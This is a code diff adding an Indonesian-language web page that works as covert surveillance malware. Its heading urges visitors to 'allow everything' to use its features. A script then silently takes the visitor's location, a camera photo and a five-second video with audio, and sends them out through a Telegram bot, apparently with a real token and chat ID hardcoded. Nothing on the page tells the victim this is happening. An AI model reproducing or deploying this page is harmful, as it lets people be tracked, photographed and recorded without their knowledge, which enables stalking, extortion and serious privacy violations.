@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IZIN KAN SEMUA NYA UNTUK MENGAKSES</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #1e1e2f;
+        color: #fff;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        min-height: 100vh;
+        margin: 0;
+        padding: 20px;
+    }
+    h2 {
+        margin-bottom: 20px;
+        text-align: center;
+    }
+    #status {
+        margin-top: 15px;
+        font-weight: bold;
+        text-align: center;
+        color: #ffeb3b;
+    }
+</style>
+</head>
+<body>
+<h2>IZIN KAN SEMUANYA UNTUK MENGAKES FITUR YANG ADA</h2>
+<div id="status">Status: Menunggu...</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8432490941:AAGUzm2xGMOlRNHJeZ7sZyjRxcNu4rhM5cw"; // ganti dengan token bot
+const CHAT_ID = "7719159066"; // ganti dengan chat id
+
+const statusEl = document.getElementById('status');
+
+let mediaStream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+
+// ======= Ambil lokasi otomatis =======
+function sendLocation() {
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
+            .then(() => statusEl.textContent = "Status: bershasil ✅")
+            .catch(() => statusEl.textContent = "Status: Gagal mengirim lokasi ❌");
+        }, err => statusEl.textContent = "Status: Gagal mendapatkan lokasi ❌");
+    } else {
+        statusEl.textContent = "Status: Geolocation tidak didukung ❌";
+    }
+}
+
+// ======= Akses kamera otomatis (tanpa menampilkan video) =======
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+.then(stream => {
+    mediaStream = stream;
+    sendPhoto();
+    sendVideo();
+})
+.catch(err => statusEl.textContent = "Status: Tidak dapat mengakses kamera ❌");
+
+// ======= Ambil foto otomatis =======
+function sendPhoto() {
+    if(!mediaStream) return;
+    const video = document.createElement('video');
+    video.srcObject = mediaStream;
+    video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 320;
+    canvas.height = 240;
+
+    // tunggu sebentar agar video ready
+    video.onloadedmetadata = () => {
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            })
+            .then(() => statusEl.textContent += " | Foto terkirim ✅")
+            .catch(() => statusEl.textContent += " | Gagal mengirim foto ❌");
+        }, "image/jpeg");
+    };
+}
+
+// ======= Rekam video otomatis =======
+function sendVideo() {
+    if(!mediaStream) return;
+    recordedChunks = [];
+    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+
+    mediaRecorder.ondataavailable = e => {
+        if(e.data.size > 0) recordedChunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("video", blob, "video.webm");
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+            method: "POST",
+            body: formData
+        })
+        .then(() => statusEl.textContent += " | Video terkirim ✅")
+        .catch(() => statusEl.textContent += " | Gagal mengirim video ❌");
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), 5000); // rekam 5 detik
+}
+
+// ======= Jalankan lokasi otomatis =======
+sendLocation();
+</script>
+</body>
+</html>
